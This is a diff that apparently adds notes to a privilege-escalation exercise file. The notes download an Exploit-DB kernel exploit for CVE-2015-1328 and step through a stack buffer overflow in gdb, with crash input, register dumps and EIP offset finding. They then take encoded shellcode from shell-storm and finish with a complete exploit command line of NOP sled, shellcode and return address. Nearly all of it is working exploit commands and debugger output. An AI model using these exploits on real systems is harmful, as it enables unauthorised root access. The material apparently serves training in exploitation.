@@ -46,11 +46,113 @@ X-FWD: blabla
 
 
 ==== EXERCICE 4 ====
+
+KERNEL:
 curl -k https://www.exploit-db.com/download/37292 > bbb.c
 CVE-2015-1328
 
 
-==== EXERCICE 5 ====
+LOCAL BIN:
+
+
+run ` perl -e 'print "\x90"x256; print "aaaabbbbccccddddeeeeffffgggghhhhiiii"'`
+
+Your input: ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������aaaabbbbccccddddeeeeffffgggghhhhiiii
+
+Program received signal SIGSEGV, Segmentation fault.
+--------------------------------------------------------------------------[regs]
+  EAX: 0x00000000  EBX: 0xB7FD1FF4  ECX: 0x00000000  EDX: 0x00000000  o d I t S z a P c 
+  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x63636363  ESP: 0xBFFFF4E0  EIP: 0x64646464
+  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
+Cannot access memory at address 0x64646464
+
+
+EIP@0x64646464 --> dddd
+
+
+   0x0804844b <+55>:	mov    DWORD PTR [esp+0x4],eax
+   0x0804844f <+59>:	lea    eax,[esp+0x10]
+   0x08048453 <+63>:	mov    DWORD PTR [esp],eax
+   0x08048456 <+66>:	call   0x8048330 <strcpy@plt>
+   0x0804845b <+71>:	mov    eax,0x8048561
+   0x08048460 <+76>:	lea    edx,[esp+0x10]
+   0x08048464 <+80>:	mov    DWORD PTR [esp+0x4],edx
+   0x08048468 <+84>:	mov    DWORD PTR [esp],eax
+   0x0804846b <+87>:	call   0x8048320 <printf@plt>
+   0x08048470 <+92>:	mov    eax,0x0
+   0x08048475 <+97>:	leave  
+   0x08048476 <+98>:	ret    
+End of assembler dump.
+
+gdb$ b *0x08048456
+Breakpoint 2 at 0x8048456
+gdb$ r
+--------------------------------------------------------------------------[regs]
+  EAX: 0xBFFFEDE0  EBX: 0xB7FD1FF4  ECX: 0xBFFFF284  EDX: 0xBFFFF214  o d I t S z a P c 
+  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF1E8  ESP: 0xBFFFEDD0  EIP: 0x08048456
+  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
+--------------------------------------------------------------------------[code]
+=> 0x8048456 <main+66>:	call   0x8048330 <strcpy@plt>
+   0x804845b <main+71>:	mov    eax,0x8048561
+   0x8048460 <main+76>:	lea    edx,[esp+0x10]
+   0x8048464 <main+80>:	mov    DWORD PTR [esp+0x4],edx
+   0x8048468 <main+84>:	mov    DWORD PTR [esp],eax
+   0x804846b <main+87>:	call   0x8048320 <printf@plt>
+   0x8048470 <main+92>:	mov    eax,0x0
+   0x8048475 <main+97>:	leave  
+--------------------------------------------------------------------------------
+
+Breakpoint 2, 0x08048456 in main ()
+gdb$ x/2wx $esp
+0xbfffedd0:	0xbfffede0	0xbffff413
+gdb$ x/wx 0xbfffede0
+0xbfffede0:	0xb7e3eb97
+gdb$ x/wx 0xbffff413
+0xbffff413:	0x90909090
+gdb$ c
+
+
+exploit:
+http://shell-storm.org/shellcode/
+Linux
+
+char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x21\x80"
+     		    "\x6c\x0e\xff\x01\x80\xe9\x01\x75"
+			   "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
+				   "\x6b\x0c\x59\x9a\x53\x67\x69\x2e"
+					   "\x71\x8a\xe2\x53\x6b\x69\x69\x30"
+						   "\x63\x62\x74\x69\x30\x63\x6a\x6f"
+							   "\x8a\xe4\x53\x52\x54\x8a\xe2\xce"
+"\x81";
+
+"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81";
+
+perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"' | wc
+     0       2      57
+
+gdb$ x/300wx 0xbfffede0
+0xbfffede0:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffedf0:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee00:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee10:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee20:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee30:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee40:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee50:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee60:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee70:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee80:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffee90:  0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffeea0:  0x90909090	0x90909090	0x90909090	0x90909090
+
+
+
+./local_bin_exploit ` perl -e 'print "\x90"x(1024-57-500); print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"; print "\x90"x500;print "aaaabbbbcccc"; print "\xe0\xee\xff\xbf"'`
+
+
+
+CRONTAB
+
 
 
 
